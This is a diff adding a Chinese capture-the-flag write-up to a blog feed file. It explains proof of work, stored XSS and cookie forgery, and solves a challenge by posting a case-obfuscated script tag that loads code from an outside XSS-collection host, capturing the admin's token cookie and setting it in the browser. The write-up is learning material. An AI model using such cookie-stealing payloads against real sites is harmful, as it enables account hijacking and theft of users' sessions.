@@ -4,6 +4,19 @@
   
   
   <entry>
+    <title>第七次记录</title>
+    <link href="/2020/03/18/%E7%AC%AC%E4%B8%83%E6%AC%A1%E8%AE%B0%E5%BD%95/"/>
+    <url>/2020/03/18/%E7%AC%AC%E4%B8%83%E6%AC%A1%E8%AE%B0%E5%BD%95/</url>
+    
+    <content type="html"><![CDATA[<h2 id="题目考查点"><a href="#题目考查点" class="headerlink" title="题目考查点"></a>题目考查点</h2><p>1.Proof of work概念<br>2.Xss注入操作<br>3.修改cookie操作</p><h2 id="涉及知识点"><a href="#涉及知识点" class="headerlink" title="涉及知识点"></a>涉及知识点</h2><p>1.proof of work,即工作量证明。简单理解就是一份证明，来确认你做过一定量的工作。或者说，只有针对某个协议或者函数进行一定量的运算得出结果，才可以取得证明。其核心特征是不对称性：工作对于请求方是适中的，对于验证方则是易于验证的。详细介绍可见<a href="https://blog.csdn.net/lucky_greenegg/article/details/52530570" target="_blank" rel="noopener">pow介绍</a><br>2.XSS即跨站脚本攻击，利用对输入数据过滤的不严格，导致程序执行了用户在页面中输入的恶意代码，合法用户在之后访问的时候，这些恶意代码会被执行。<br>详细介绍可见：<br><a href="https://blog.csdn.net/weixin_43843847/article/details/89353390?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">XSS入门</a><br><a href="https://blog.csdn.net/sdb5858874/article/details/87913903?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">XSS进阶教程</a><br>3.XSS平台：在xss平台上创建项目后，在网站有xss的地方插入项目中的代码，执行的时候就会把相应的信息发送到xss平台上，可以用来查看cookie、账号等信息。详细介绍可见：<a href="https://www.zhihu.com/question/26964939" target="_blank" rel="noopener">xss平台作用</a></p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>1.home页面有留言板和<code>substr(md5(‘proof of work’),0,6)===’sdsaw1’</code>的字样，留言板应该是输入xss代码的地方，后一句代码的意思是找到某个字符串经md5编码后的前六个字符和sdsaw1保证强相等。同时，admin页面上提示需要使用管理员的cookie，所以获得管理员的cookie是关键。<br>2.根据pow的概念，直接用暴力枚举的方法找到符合条件的数字字符串。提交后出现同时在xss平台上创建项目，将项目中提示的代码<code>&lt;sCRiPtsRC=http://xss.fbisb.com/TMVX&gt;&lt;/sCrIpT&gt;</code>复制到留言板中。提交后显示如下‘your message has been in the queue of admin readlist’，也就说明了管理员方已经执行了xss代码，cookie等相关信息应该已经发送到了xss平台上。在平台上接收到的cookie内容为<code>cookie:token=a9011a0e551f181c1c526881befac44d</code><br>3.在admin页面打开chrome浏览器自带的开发者工具，修改cookie，刷新页面出现flag。</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>第六次记录</title>
     <link href="/2020/03/17/%E7%AC%AC%E5%85%AD%E6%AC%A1%E8%AE%B0%E5%BD%95/"/>
     <url>/2020/03/17/%E7%AC%AC%E5%85%AD%E6%AC%A1%E8%AE%B0%E5%BD%95/</url>
